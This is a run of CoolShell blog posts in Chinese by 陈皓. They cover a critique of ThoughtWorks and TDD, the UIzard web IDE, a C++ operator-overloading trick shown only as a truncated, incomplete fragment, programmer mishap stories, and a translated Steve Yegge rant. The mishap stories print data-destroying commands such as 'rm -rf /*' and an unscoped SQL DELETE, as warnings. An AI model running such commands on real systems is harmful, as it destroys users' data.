* 中国ThoughtWorks的咨询师们，喜欢参加各种研讨会，以及各种论坛，媒体采访。看看这篇文章，空洞，空洞，还是空洞。* 中国ThoughtWorks某些咨询师们大多都比较敏感，都是坚定不移的敏捷信徒。你别说有不同观点了，你就问个有点疑问的问题，他们就敏感了，就要反驳或是教育你了。* 中国ThoughtWorks某些咨询师们大多都很能说，和他们在一起，你基本上说不上话，就算说得上，他们也不会听你的，而且在不停地说教。大多数时候，他们都有很多的神一般的理论，比如：“你这不是真正的敏捷，真正的敏捷不是这样的”，“TDD中的T，是什么测试都无所谓。它就是设计。”，“TDD更强调设计，而不是测试本身。所以，TDD并不适用于菜鸟程序员。”，“你是在用锤子拔钉子”，“敏捷不需要文档，代码不需要注释”，“能学会的人他不需要看这些文字，不能学会的人他看了也是白看”，“它不是对不对的问题，它是可笑的”，“要使用一种设计方法，你就必须（1）会做设计；（2）做设计。它难在有些项目不做设计，有些人不会做设计”……大家可以看看InfoQ的这个针对本章文章的讨论，注意熊节同学的观点，他是在谈TDD呢，还是在说我呢？可见他是带着目的来参加这个讨论会的。但是大家有多少人看明白了他在说什么？他除了敏感，除了那些“神一般的观点”，你真的实在不知道他在说什么，你是不是和我一样，对他的发言感到很空洞呢？（熊节同学可能以为InfoQ把我邀请去了，其实我没有去。大家可以去看看， **那不是讨论，那是一群TDD的信徒们在自己炒作自己呢** ）
我不厌其烦地再给咨询师们提那个建议—— **咨询师就像裁缝，不是只为设计时装的设计师，你们做的是量体裁衣的活儿。对于不同的身材，不同的体质，要用不同的财料和尺寸; 对于不同的性格，将会是不同的风格; 对于不同的场景，也将会是不同的服装，游泳和出席宴会是两种不同的服装。服装的好坏不是服装本身漂亮不漂亮，而是合不合身，搭配地好不好，适不适合相应的场景，着衣的人感觉到的是不是舒服** 。——————————————#### 关于ThoughtWorks和InfoQ给我的信文章写得太长了，大家见笑了，也见谅！这是最后一段了。1） TW的王效珅在春节前和我有几次电子邮件的往。我觉得王效珅是个很出色的公关人员，她用硬朗来形容我，把我一下子形容老了几十岁。她希望和我做沟通，希望让我和TW的咨询师谈一谈，我没有答应，也没有拒绝。春节期间还给我打来了电话祝我春节快乐，真是太让我感动了。她尊称我老师，可是我并不买帐，因为我觉得我没有资格成为老师，我也建议她也不要随便叫人老师。下面，是我给她的回信中的观点。在谈到如何管理项目时，我这样回复她的> 你可以理解成——你们就像是黄埔军校，西点军校出来的高材生，而我就则是一个天天在各种战场上摸爬滚打并被打得灰头土脸的土贼。我不相信流程和各种Best > Practice，我只相信的是人。 > > > 我最关心的是软件开发中的三件事，第一个是人，第二个还是人，第三个还是人。第一个人是实现项目的人，第二个是项目的所有人，第三个是项目外周边有关系的人。我不但关心他们的想法，他们的软/硬能力，我还更关心他们的风格，他们的性格，还有他们的成长经历。这样我才能在权衡项目中那些各种乱七八糟东西的时候，懂得怎么plan，怎么run，怎么communication，怎么manage > 才会是真正有效的（效果+效率）。motivate和项目有关的每个人，这才是我心中的敏捷！（这其中是需要花大量的心血的，相当的影响寿命）
在谈到是否见面时，我是这样回复她的>   * 其一，在网上，不只是我的言论对TW有微辞，需要我们每一个人每一个公司树立一个好的心态就好了（网上骂我的也很多，我自以为我的心情还不错）。 >   * 其二，如果做的好，那就经得住考验，经得住质疑，好的东西一定会有好的结果，有了结果，拿结果和事实说话，这是最好的方式。 >   * 其三，你说的那位技术上的同事，据你说是对我很欣赏，也常看酷壳，那么以前应该交流过才对啊，不应该是我质疑了你们的时候。呵呵。 >   * 其四，我绝对不是一棍子打死一片的人（我原文中也多次提过Agile中有一些提法是不错的），但是我也不是看到一个好的就大唱颂歌的人。2）关于InfoQ张凯峰主编的来信，原文如下：>   >  From: [[email protected]](/cdn-cgi/l/email-protection)   >  Date: Tue, 15 Feb 2011 20:24:27 +0800   >  Subject: 邀请参加TDD虚拟座谈会的讨论   >  To: [[email protected]](/cdn-cgi/l/email-protection)   > > > 陈皓你好， > > > 我是InfoQ中文站的主编张凯峰。最近你的《TDD并不是看上去的那么美》一文引起的广泛的关注，我们想就此做一次虚拟的座谈会讨论，邀请你来参与一下关于TDD的讨论。邀请的专家还包括thoughtworks的咨询师，以及其他敏捷方面的专家。以给读者更加广泛的视角和分享。欢迎参加，谢谢。 > > 以下是问题，可以把每个问题的答案发回给我。截止时间是两天。任何问题，请与我沟通，谢谢。 > > 请介绍你自己，以及TDD的实践经验。   >  TDD跟Test是什么关系呢？TDD的T就是Unit Test吗？   >  你认为实施TDD需要怎样的前提条件？TDD难在哪儿？   >  TDD之于需求、设计、代码质量是怎样的关系和影响？   >  你认为实施TDD容易犯的错误是什么？TDD的不足在哪些方面？   >  一般开发者需要多久能掌握TDD呢？请向读者推荐一下TDD的学习资料吧。 > > Thanks, > > —   >  张凯峰 | Kevin Zhang | InfoQ China Managing Editor   >  InfoQ China：http://www.infoq.com/cn
我的回复如下（我老婆 说我回复得太贫了，我接受！）> From: [[email protected]](/cdn-cgi/l/email-protection)   >  To: [[email protected]](/cdn-cgi/l/email-protection)   >  Subject: RE: 邀请参加TDD虚拟座谈会的讨论   >  Date: Tue, 15 Feb 2011 21:45:51 +0800 > > 张凯峰主编，您好！ > > 谢谢你们关注我的文章，见笑了。 > > 你们真是很厉害，相当善于发掘热点新闻。果然是媒体的专业素质。;-) > > > 我的文章不应该有那么大的能量，一个根本没有推广的个人blog，随便发布一些自己的想法，不是自我炒作，自己的blog嘛，想啥说啥，就像大街上的阿猫阿狗一样随便发表点个人意见，不会有人在意的。哪能引得您们的关注。真是让我受宠若惊。 > > > 另外，你问到的那些问题，绝大多数的答案都在我的那篇文章里了。如果你们想转载我的文章，转过去就是了，只要注明作者和出处就OK了。千万不要用于任何的商业目的和炒作，这样我会很不高兴的。 > > > 所以，我还是谢绝这个讨论了。如果你真想找人讨论的话，执我这样观点的人并不在少数，Google一下，可以找到很多。尤其是国外的，有些作者和我一样，都是做了十几年的项目的，都是做大大小小也有20来个项目的，各种人，各种事，各种项目都经历过很多，找那些人岂不更好？ > > P.S，您的邮件还真强势，在“谢谢”和“谢谢”中就直接让我回答这些问题，还只限两天时间。真是个大主编，让我学到了“谢谢”的另一种用法。谢谢！ > > 祝 工作顺利！   >  陈皓
**我的观点就是我的观点，无论你同不同意，喜不喜欢，都是我的观点，****他就在那里，不卑不亢，不多不少**# Ajax开发利器UIzard作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn正如UIzard这个名字所暗示的，这是一个User Interface 的Wizard，从字面上理解，这是一个做界面的向导。这有什么奇怪的，Dreamwave之流已经是相当的成熟了，还能好得过它？是的，这个开源的项目，也许并没有那些商业软件那么成熟，不过，我想告诉你的是，这个开源软件绝对是值得我们重点关注的一个软件。你可以理解为这是一个Web开发的IDE，不过其集成了Ajax方面的东西。这并不仅仅简单的是那种“所见即所得”的编辑器。而且，它也不信仅可以让那些非程序员非常简单地创建一个从前端到后端的Web应用，而且，他还可以让你连接数据库，创建非常复杂的布局和时间线，甚至于一些套件（白板，在线的类Word，Excel，PPT等功能），所有这些，你只需要简单的点几下按钮就可以了。真是相当的强大。（下面是个抓图）!UIzard看上去很不错吧，上面的的屏幕抓图展示了，你可以非常简单地嵌入一些Google的API。而且，你还可以设置RSS相关的功能，是的，源代码是很复杂的，但是有了这个工具，你所需要的就是用鼠标点来点去。
最NB的是，你不需要在你的硬盘上安装这个工具，你完全是一个基于Web的在线IDE，真是太强大了，这是我最最欣赏的地方，真是令人难以置信。最后需要说的，这个工具的作者是一个韩国人，叫 Ryu Sungtae（韩国人的软件MS越来越猛了，比如那个著名的Kmplayer也是韩国人做的）， UIzard 由 Yahoo’ User Interface Library (YUI) 构造，这是一个基于Javascript 的用于创建各种交互式应用的程序库。虽然，目前的UIzard 只是Beta版，版本号还很新，0.9版，不过，这个项目的潜力是相当的大，值我们关注。其官方站点是：如果你想体验一下，那么，请你猛击下面的链接吧：（使用Fixfox效果更好）!UIzard创建工程(全文完)# 一些杂项资源作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前给大家介绍过一些非常有意思的杂项资源，今天再给大家介绍一些。（虽然没有上次的多，也算是一个新年礼物吧）* 首先，如果你想在你的web页上做一个小提示，你不妨到上看看，各种各样的提示风格，很不错。而且兼容于四大主流浏览器——Chrome, Firefox, IE, Safari。
* 如果你想让Java变成一个动态语言，你可以试试这个开源项目：http://code.google.com/p/ductilej/* 如果你想把你的Windows蓝屏改成红屏或是绿屏，你可以看看这篇教程：，还是挺Cool的。!image_thumb47* 如果你想使用HTML5+Javascript做一个游戏，就像制作这些HTML5的小游戏一样，你不妨考虑使用一下这个游戏框架：* 如果你想学习Emacs，而又不害怕这样的学习曲线，那么，这里有一篇相当不错的教程供你参考：!Ediff mode screenshot* 如果你对2010年的好莱坞电影票房和排行情况想有一个整体的了解的话，这里有一个很不错的图示：，阿凡达，艾丽斯梦游仙梦，钢铁侠，史端克，幕色，盗梦空间，玩具总动员，哈里波特……可能还有很多你没有看过的电影，你可以上上下载看看。* 如果你像我一样，对“Agile Development”在中国似“电视购物”般的的宣传和神化有一些异见的话，或者你对这个方法论起级信仰，认为他就像“共产主义”，“真主”，“耶稣”，“佛陀”一样可以普世的话，你不妨看一下下面这些文章：（注意，他们大多被墙）      * What Killed Waterfall could Kill Agile.     * Google Groups上的一个讨论     * Agile 水管工     * 看上去是资本主义，用起来是共产主义，打起架来是法西斯，做起爱来是无政府主义
* 最后让我向你介绍一下2010年度top 10的关于 Spring, ExtJS和Hibernate的相关文章（同意，注意撞墙）      * Tutorial: Getting Started with Spring Security     * ExtJS and Spring MVC Framework: CRUD DataGrid Example     * Ajax File Upload with ExtJS and Spring Framework     * Integrating Spring Security with ExtJS Login Page     * Spring MVC and AJAX with JSON     * ExtJS: How to Export DataGrid to Excel     * ExtJS, Spring MVC 3 and Hibernate 3.5: CRUD DataGrid Example     * Spring Security: Login and Logout Form JSP     * How to Display an Image/Link Inside an Ext JS GridPanel’s Cell     * Ext.Window Panel: Show or Hide?
**祝大家新年快乐！！**（全文完）# 恐怖的C++语言作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!我爱C++ Linus曾经(2007年9月)在新闻组gmane.comp.version- control.git里和一个微软的工程师（Dmitry Kakurin）争执过用C还是用C++，当时的那个微软的工程师主要是在做Git的Windows版，但他却发现Git的源码居然是C语言写的，而不是C++，于是他（Dmitry Kakurin）在Linux社区里发贴表示对Linux的不满，语言很直接：> Pure C as opposed to C++. No idea why. Please don’t talk about portability, > it’s BS. （纯C写的，而不是C++，不知道为什么，请别告诉我是为了移植性，这完全是胡扯。）Linux之父Linus Torvalds马上跟贴，在贴子中，Linus言辞很直接，直接表明C++是一个很恐怖的语言，他在 **贴子**中说：> ***YOU*** are full of bullshit. C++ is a horrible language. It’s made more > horrible by the fact that a lot of substandard programmers use it. > （你才是完全在胡扯。C++是一门很恐怖的语言，而比它更恐怖的是很多不合格的程序员在使用着它）
Linus的这个观点我是比较同意的，我个人也在几年前的《STL String类的写时才拷贝》以及以后的一些文章中表达过C++的确并不是一个很成熟的语言，这种观点一直都围绕着我。这是因为它的学习成本实在是太高了，编译器和类背着你做了很多你不知道的事，而且，C++非常容易地出错和发生很多意想不到的问题。当然，这篇文章并不是要继续声讨C++，也不是回顾以前的某个事件。我们这里只谈技术。昨天，我在网上看到一个邪恶的C++的示例，在这里给大家share一下，让大家看看C++这种编程语言的恐怖和邪恶的一面。下面的这个例子，比那个“#define private public”还更加邪恶。请看下面这段代码，你能告诉我它会输出什么吗？（注意main函数中高亮的那一行）Hack& operator< (Hack &a , Hack &b)     {     std::cerr << "小于操作符\n";     return a;     }Hack& operator> (Hack &a, Hack &b)     {     std::cerr <<  "大于操作符\n";     return a;     }
vector<UINT4> foo;return(0);     }!不是吧是的，上面这段代码如果只看main函数中的那句“vector<UINT4> foo”，你会觉得很眼熟，然而，事情并非那么简单，我们可以看到vector, UINT4和foo都是Hack类的实例，这就是邪恶的开始，那两个尖括号< >则成了两个运算符，大于和小于，这两个运算符却又被重载了。其实，真正的语句是：`vector.operator<(UNIT4).operator>(foo);`所以，所有的一切都符合我们的C++的规范和语法，自然程序也能被顺利编译通过（至少，在我的G++上是没有问题的）。而整个程序的运行结果自然是：$ ./horror     小于操作符     大于操作符是的，如果你通晓C++的一切的一切，你自然不会对这段程序感到惊奇。这样的事情在C/C++的世界中并不少见，要搞乱C/C++的代码并不是一件难事，花样多得数不胜数，只要看看《6个变态的C语言Hello World程序》你就知道了，而且，还有一个简单的教程《如何加密/混乱C源代码》告诉你一些简单的做法。那么，如果你有一天在读程序中看到“vector<UINT4> foo”，你会觉得那只是一个幻觉吗？
（全文完）# 5个不错的3D素材网站作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn你也许并不是一个创建3D图形的好手，你也许只能创建一些原始的东西，如：停止或灯炮标志等等这些小孩子玩的东西。而我们现实世界则需要更复杂更牛的东西，比如说一个人物，一个机车等等。这里有史上最好的5个网站，你可以通过这些网站找到你想要的模型，这些3D的模型或资源对你开发游戏一定会有很大的帮助。### 3DRT这是一个迄今为止最好的站点。不仅仅因为这个站点有很多非常专业的模型，而且这个站点在收费方面还不是太坏——经常会有一些折扣。几乎，所有的模型都是动两国的，而且他们还是有皮肤的。他们有各式各样样的格式，并且提供PSD文件，这样方便你创建自己的皮肤。### Garage Games在 Garage Games，一些艺术包也有非常“漂亮”的价格，有一些相当不错，但也有一些普普通通。这些东西完全取决于艺术家们怎么去创作他们的。这个站点并不提供很多的格式。另外，在 Garage Games上，你还能找到很多不错的声音素材。### FPS Creator这个站点有很多相当不错的模型和声音。所有的素材都是动画的和有皮肤的。所有的都是基于FPS creator格式的和可以被转换成其它格式的 .X 格式。有一个很不错的是，这些FPS 模型（手臂和火枪）包括了很多的乱七八糟的生物和敌人，这些东西几乎可以用来直接用于游戏了。
### Realm Crafter Packs这里的模式是中等质量的。他们并不是最好的，不过他们的价格可能是比较低的。几乎所有的模型都是有动画的并有一些不同的格式。有一些模式只是静态的而没有动画。### Tridinaut如果你想一些中世纪的武器，那么这个站点会给你提供很多这类的玩意。质量非常好，而且所有的模型现在还在免费。如果你给上 $50-$100 美金，他们会给你制作你想要的东西，这些人的确非常不错。希望你觉得这5个站点对你的游戏编程的工作很有用。文章：来源# 程序员那些悲催的事儿作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在StakeOverflow上有这样一个贴子叫“Confessions of your worst WTF moment”（WTF就是What the fuck的缩写），挺有意思的，我摘几个小故事过来，希望大家在笑过之后能从中学到什么—— **所有的经验都是从错误中来的** （我在其中加了一些点评）> > 我们公司的软件是给警察局用的，那是一个对用来处理被逮捕的人的系统，此系统还需要收集脸部特征和指纹信息，并且，这个系统和会向FBI的系统提交这些信息。当我们在测试这个系统的时候，我们一般都是用我们自己的指纹，当然，数据库联着的是我们的测试数据库。不过，有一次，在我们测试完后，我们忘了把系统切换回生产库，于是我们的测试数据库就联上了生产环境，于是我们的指纹信息和照片就散布到了其它系统中……清除我们警察局这边的还好办，但是，你需要波士顿警察局警司去法院签字才能从FBI的数据库中清除我们的信息。
**点评** ：测试环境和生产环境的数据不要混在一起。> > 有一次，我需要向新系统中导入一堆数据，因为数据量太大，需要5个小时，只能在夜里来干，在系统需要正式使用前2个小时，数据导完了，此时是凌晨4点。随后，我需要删除一些数据，于是我在SQL命令地上输入了“DELETE > from important_table; where id=4”。是的，我没有看到哪里还有个分号，天啊。**点评** ：这就是加班工作的恶果。另，在delete之前最好先做一次select。> 我把我的管理员口令提交到了一个开源软件的源码里。**点评：** 1）版本管理器里的东西是删不掉的。2）一些用户和口令要hard code在代码里，所以，不要混用代码使用的权限和管理员的权限，小心管理程序的运行权限，为其注册专门的用户。> > 我为一个很大的银行开发软件，在我的代码里，我为一段理论上根本不可能执行到的代码加了一个报错信息。有一天，不可思异的事发生了，这条报错信息显示在了该银行的1800个分行的超过10000个终端上——“如果你看到这个信息，说明整个系统被Fuck了，回家吧，祝你过得愉快！”**点评：“** 假设是恶魔”，Assume意为Ass – u – me，意为——搞砸你和我。对于一些关键东西，永远不要做假设。小心你言语中的——“可能、应该、觉得、不应该”等词语，程序可不认这些东西。
> > 我远程登录到服务器上加几个防火墙规则。第一件我想干的事是在不允许任何人的任何连接，第二件是，为某个端口打开访问权限。不过，我在做完第一件事后就把配置保存了，结果其生效了……**点评** ：这样的事经常发生，做远程网络管理的人多少会有那么几次发生这样的错误。在你将你的网络配置生效前，你得想一想，断线了你是否还能登得上去。改配置不要太冲动，生效前检查几次。> 我们的代码中有一个模块完美地工作了很多年了，只是代码太乱了。我说服了我的老板，我可以重写这个模块，于是我花了三个星期来重写这个模块。今天 > ，我还记得，我的老板站在我的后面看着我，而我在在流着斗大的法汗珠去fix被我重写的“超级漂亮”的那个模块中一个接一个的bug。从那以后，我再也不重写代码了，除非有重大的利益。**点评：** 这就所谓的屠宰式编程。这个案例告诉我们两个道理，1）维护代码要用最最最保守的方法来进行。2）重构代码前要像一个商人一样学会计算利益。当然，ThoughtWorks的咨询师一定会告诉你TDD，结对，极限等等方法告诉你如果实践重构。但我想告诉你，一个程序在生产环境里运行好几个年能没有问题是一件很不容易的事，那怕其中的代码再烂，你再看不过去，你都要有一个清醒的头脑明白这几点， **1）软件的运行质量是远远大于代码质量的，2）你的测试案例是远远小于生产环境的，3）软件的完美的质量，是靠长时间的运行、测试和错误堆出来的，而不是某种方法论** 。
————————————————相信大家做程序员这一生中也有很多发生在自己身上的悲催的事儿，欢迎分享。我先分享几个我亲身经历过的事。一个发生在我的领导身上。> > 我98年刚参加工作的时候，在某单位网络部门，一次，我们整个部门去给下属单位培训Cisco路由器，结果我们发现带去培训地点的设备少带了集线器HUB，设备连不起来。于是领导很不高兴，质问我们为什么没有带集线器？那几个对领导平时就不满的老员工说办公室里没有集线器了，都借给别的部门了。领导想了想，问我：“陈皓，我记得上次我给过你个集线器”，我说，“好像没有吧，我记不起来了，什么牌的？几口的？”，领导说：“什么牌子想不起来了，不过我记得那个集线器是 > **一个口** > 的”。“一个口的？！”，我心里嘀咕着，“真敢说啊”。但我不敢接话了。那几个老员工来劲了——“哪有一个口的HUB啊，一个口的怎么联两台电脑啊？”，领导说：“用两个一个口的不就行了”。领导这话一出，全场一片寂静，无言以对……**后来：** 我们所有的组员都离开了我们的这个领导，我们的这个领导今天还在那里工作。我想告诉大家， **很多时候该走的是领导** （包括外企，我上一东家正在裁人，不过我觉得该被裁掉的应该是那些经理）。我们的领导经常出这样或那样的笑话，这让我随时随地地警醒自己——“ **不要当一个被人笑话的经理** ”，于是，今天我还在努力地学习技术。
另一个发生在我身上> > 刚刚接触Linux的时候，还不是很懂，那时的PC还只有奔3，编译公司的程序好慢啊，有时候为了调查一个问题，需要不断地打log，来来回回地编译，很不爽。直到有一天，硬盘不够了，df一下，发现/dev/shm还有空间。于是，把全部程序copy了过去，发现编译起程序超快无比，爽得不行。于是就把工作环境放在/dev/shm下了，连开发都放在这里了。这一天，开发一个功能，改了十来个文件，加班很晚，觉得基本搞定，大喜，回家睡觉。第二天一来，发现/dev/shm下空了，一个文件都没有了，问同事，同事不知，同事还安慰我说，上次他的文件也不知道被 > 谁删了，于是我大怒，告老板！老板也怒，发邮件到整个公司质问大家谁删了陈皓的程序，无人应答。IT部门答，“昨晚唯一的操作就是重启了linux服务器，什么也没干，不过我们天天备份服务器，可以恢复”，IT部门问我丢的文件在哪个目录下？于是，我reply > to all – “在/dev/shm下……”，哎，人丢大发了……**后来：** 我很感谢我以前犯的这个错，从那天以后，我开始立志学好Linux，这个错误让我努力，让我发奋。所以，我想告诉大家—— **尤其是刚出道的程序员，你们要多多犯错，要犯错那种丢死人的错，这样你才会知耻而勇** 。
再来一个发生在我同事身上的> > 01年，我们开发银行系统，在AIX上开发，RICS6000很贵，只能在客户那里开发，开发进度很紧张，慢慢地硬盘就不够用了，系统中有大量的垃圾文件，于是需要清除一些文件，于是有一个同事写了一个脚本，可以自动清除的各种不重要的文件，里面有一条命令大致是这个样子“ > rm -rf > ${app_log_dir}/*”，意为清除程序运行的日志。为了使用这个脚本，需要在root用户下运行，一开始还不错。直到有一天，某人一运行，整个根就没了。搞得整个团队只能用一周前的备份重写已写好的代码。后来，才发现原因是${app_log_dir}变量为空，于是成了“rm > -rf /*”……**后来：** 这个事后，我的那个同事，把rm命令改了名，并自己写了一个rm命令，把删除的文件先放到一个临时目录下。而我也因为这个事情，到今天，每次当我在root目录下使用rm时，敲击回车的手都是抖的。（另，rm时永远使用绝对路径）这里，我想告诉大家—— **犯错不可怕，可怕的是不会从中总结教训，同一个错犯两次** 。欢迎分享发生在你身上那些悲催的事。**（本文请勿用于商业用途，转载时请注明作者和出处）**
# SteveY对Amazon和Google平台的吐槽作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnSteve Yegge， Amazon的前员工，现任Google员工，其本来想在Google+上和Google的员工讨论一些关于平台的东西，结果不小心把圈子设成了Public，结果这篇文章就公开给了全世界，引起了剧烈的反应。发布后很快他就马上把这篇文章删了，不过，互联网上早备份了下来——SteveY’s Google Platforms Rant。后来，Steve在其Google+上作了一些解释，大体是说他喝多了，而且又是在凌晨，所以大脑不清，文章中的观点很主观，极端且不完整，还有Google的PR对他很好，等等，等等 。几个星期前看到时就一直都想翻译一下这篇文章，不过因为最近事情太多，文章又很长，所以现在才翻译完成，翻译的不好，还请大家指正。### 导读在你阅读正文以前，我想说明几点，希望你注意一下：* Steve这个人非常喜欢写长篇大论的东西。而且比较喜欢辛辣调侃和恶搞的文风，这点大家要注意！* 文中先“骂”Amazon公司，再通过“骂”Amazon的创始人贝索斯Bezos并烘托出他的的悟性和雄心，最后教育了一下Google。
* 我把文章分成了三个部分，这样方便大家阅读和讨论。第一部分只是个人情绪化的抱怨，第二部分是说Amazon的成长，第三部分是教育Google，我觉得第二部和第三部分是重点。* 对于我们来说，我们应该获取Steve那些关于平台（Platform）相关的那些有价值的观点。尤其是他说的Amazon如何进化成一个平台性的公司，以及阐述Google应该怎么做的那些观点。* 关于对Amazon的那些指责，我想说，6年，对于一个世界级的互联网公司，已经很不一样了。### 正文#### 第一部分我曾在Amazon工作了六年半，现在，我在Google的日子也差没不多这么长了。对于这两家公司，有一件事总是萦绕着我——这种感觉一天比一天强烈──那就是，Amazon每件事都做错了，而Google每件事都做对了。当然啦，这是很笼统的话，但却是惊人的准确，相当的疯狂吧。大概有一百甚至两百种不同的地方可以让我们去比较这两个公司，而Google可能在每一项都能胜出，如果我记的没错，除了其中3项以外。因为，我曾用电子表格把这些项都列出来了，只是法务部门不会让我给任何人看，即使人事招募部门很喜欢这个报表。这里，让我先给你个例子让你稍微体会一下：Amazon的人事雇用流程有根本上的缺陷，因为各个团队各招各的人，以至于，各团队之间的招聘标准相当的不一致性，即使他们通过各种努力来统一标准，但是实际操作上却是一团糟；他们没有真正的SRE（陈皓注：Site Reliability Engineer ），工程师们什么事都要做（陈皓注：所谓SDE – Someone Do Everything）、几乎没时间编码。当然，不同的部门有不同的情形，不过，这取决于你的运气。他们不搞慈善，也不帮扶贫困人群，也不搞社区贡献，或是其它相似的活动。在那里，他们从来不谈这些，或许只有在说笑话的时候才会提到。他们的办公环境是个灰尘及污迹四处的像农场一样的隔间，他们在公共区域连一分钱装修的都不会花，而且，他们的薪水和福利相当差，只是近来与Google和Facebook竞争人才，这个差距才变得非常地小。不过，他们没有我们有的津贴或额外奖金——他们只是给你录用信上的那个数字，就这么多。他们的程序代码完全就是灾难，无论什么都没有任何的工程标准，除了各别团队有一些。
公平起见，他们的确有套非常非常不错的版本控制管理系统，而这是我们（Google）需要尽力赶上他们的地方，他们还有一个漂亮的发布/订阅系统，我们也没有相对应的东西。不过，就大体而言，他们有的不过是一堆蹩脚的工具，用关系数据库来读取或写入状态机里的信息中罢了。我们不应该这么搞就算这样做是可以。这就是我所所说的那3件事中的两件事Amazon比Google强的，那就是的他们的发布/订阅系统以及版本控制和管理系统。我猜你也许会为他们争辩到——他们要更快更早地推出服务并通过狂热地迭代来不断地改进和完善。他们把服务发布的优先级看得比任何事都重，包括工程纪律或是其它一堆可能会让其花时间的事务。所以，即使这么做让他们在市场上有了某种程度的竞争优势，但也造成其他足够多的问题，总之，这样的做法算不上是个漂亮的扣篮。但是，他们有一件事做的非常非常好，其好到可以把其他政治，理念，技术上的消耗和混乱 **完全** 弥补回来。#### 第二部分Jeff Bezos是个臭名昭彰的微管理经理人，他的微管理都管理到了Amazon零售网站上的每一个显示像素。他雇佣了Larry Tesler——Apple的首席科学家，他可能是全世界最有名也最受尊敬的人机交互接口专家，然而，Bezos忽略了Larry三年来提出的每一个建议，直到Larry最后——明智地——终于离开了公司。Larry本应做一些大型可用性（Usability）研究，并可以系统地了解那个根本就没有人能够搞懂、使用那该死的网站，可是，Bezos对于那些像素不放手，这些页面上的那几百万个显示像素就像是他的孩子一样。所以，他的这些孩子还留着，而Larry没有。
当然，微管理不是第3项Amazon做的比我们好的事。我的意思是，没错，他们微控管理做地非常地好，但我不会把这项列在他们的强项清单上。我这样说只不过是为了我下文做铺垫，帮助你了解我后面要说的事儿。我们现在要说的这个人，是在多个严肃的公开场合说要来Amazon工作就应该付他钱才对的人。当有人跟他意见不同时，他会递出写有他名字的黄色即时贴以提醒那个人“谁是公司的老大”。这家伙是……，Steve Jobs，我想，除了没有品味和设计能力，他们很相似。千万别误解我，Bezos是个绝顶聪明的人，只不过他把那些正常的管控搞得像嗑了药的嬉皮士一样罢了。所以，有一天，Jeff Bezos下了一份命令。当然，他总是这么干，这些命令对人们的影响来说就像用橡皮槌敲击蚂蚁一样。这个命令大概是2002年，我想误差应该是在正负1年内 —— 这个命令发布的范围非常地广，设想很大，让人眼珠子鼓出来的那种，这种惊讶程度和其他的命令相比，就好像你突然收到公司给你的奖金一样让人惊讶。这份大命令大概有如下几个要点：（陈皓注：这里是本篇文章的要点！如果这真是Bezos发出来的，那么太赞了，Bezos完全就是一个系统架构大师啊，那可是2002年左右啊。作者调侃Bezos完全是正话反说啊）
>   * 1) 所有团队的程序模块都要以通过Service Interface 方式将其数据与功能开放出来。（陈皓注：Service > Interface也就是Web Service） >>   * 2) 团队间的程序模块的信息通信，都要通过这些接口。 >>   * 3) > 除此之外没有其它的通信方式。其他形式一概不允许：不能使用直接链结程序、不能直接读取其他团队的数据库、不能使用共享内存模式、不能使用别人模块的后门、等等，等等，唯一允许的通信方式只能是能过调用 > Service Interface。 >>   * 4) > 任何技术都可以使用。比如：HTTP、Corba、Pubsub、自定义的网络协议、等等，都可以，Bezos不管这些。（陈皓注：Bezos不是微控经理吗？呵呵。） >>   * 5) 所有的Service > Interface，毫无例外，都必须从骨子里到表面上设计成能对外界开放的。也就是说，团队必须做好规划与设计，以便未来把接口开放给全世界的程序员，没有任何例外。 >>   * 6) 不这样的做的人会被炒鱿鱼。 >>   * 7) 谢谢，祝你有个愉快的一天！ >
哈哈！你们这150个前Amazon的员工，当然能马上看出第7点是我开玩笑加上的，因为Bezos绝不会关心你的每一天。不过第6点是很真实的，于是，所以人们都去工作。Bezos并派出了几位首席牛头犬来监督并确保进度，领头的是和熊一样大的牛头犬：Rick Dalzell，Rick是以前是陆军突击队队员，西点军校毕业生，拳击手，和沃尔玛的首席虐刑官 / CIO，而且他也是个高大、和蔼、令人敬畏的人，还是经常使用”hardened interface”词的人，Rick 本来的走路和说话都比较hardened interface，所以不用多说，每个人都得干 出有 **重大的** 进展，这样Rick才能看得见。在接下来的几年，Amazon内部转变成面向服务架构SOA(Service-Oriented Architecture)，在这华丽转身的过程中，他们学到了相当巨多巨多的东西。我在的那个时候，世界上就有很多很多的关于SOA的学术文档，但在Amazon的那种超大规模的面前，世间的这些文档就好像告诉印第安纳琼斯（陈皓注：电影夺宝奇兵男主角）过马路前要先看看两边有没有来车一样没用，Amazon的研发工程师们在这个过程中发现了很多很多的问题，并从中学到了很多。下面只是他们这些问题中的沧海一粟：
* pager escalation（陈皓注：生产线上问题的寻呼系统）变得比较困难，因为ticket可能会转过来转过去（陈皓注：ticket就是处理问题的工单），只到转了20次，都找到真正能解决问题的团队和人。如果每一个呼叫都花去团队的15分钟的响应时间，那在找到真正的团队之前，几小时就已经过去了，除非，你能建造出很多很多的脚手架，测量标准和报告。* 每一个和你的相关团队突然间都可能成为一个潜在性的DOS攻击者。没人可以让事情有进展，直到在每一个Service里放上配额（quota）与节流阀（throttling）的机制。* 监控与QA是被统一了。如果你不进行一个大规模的SOA，你就不会这么去想。但是，等到你的Service说，“是的，我还好！”，但实际情况可能是，服务器里唯一能正常运作的功能就是一个快乐的机器声音在呼叫你：“我很好，收到，收到”。为了要确认整个服务能正常运作，你需要对Service的每一个部分都去Call一下。这个问题会以递归的形式地出现，直到你的监控系统能够全面性地系统地检查所有的Services和数据，此时，监控系统就跟自动化测试QA没什么两样了，所以两者完美的统一了。
